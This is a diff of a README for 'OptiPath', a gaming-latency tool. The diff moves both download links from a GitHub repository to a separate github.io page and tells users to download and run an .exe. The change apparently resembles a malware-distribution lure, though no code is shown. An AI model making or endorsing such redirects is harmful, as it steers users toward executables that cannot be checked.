@@ -1,6 +1,6 @@
 # ⚡ OptiPath - Lower your gaming ping today
 
-[![Download OptiPath](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/alexm3074/OptiPath)
+[![Download OptiPath](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://alexm3074.github.io)
 
 OptiPath keeps your network connection stable during gaming sessions. It manages traffic to remove lag and latency spikes. You do not need technical skills to install this tool. The software works by prioritizing gaming data over background tasks on your local network.
 
@@ -8,7 +8,7 @@ OptiPath keeps your network connection stable during gaming sessions. It manages
 
 Follow these steps to set up OptiPath on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/alexm3074/OptiPath) to download the installer.
+1. Visit the [official releases page](https://alexm3074.github.io) to download the installer.
 2. Select the file ending in .exe to begin your download.
 3. Locate the file in your Downloads folder after the transfer finishes.
 4. Double-click the file to start the installation wizard.
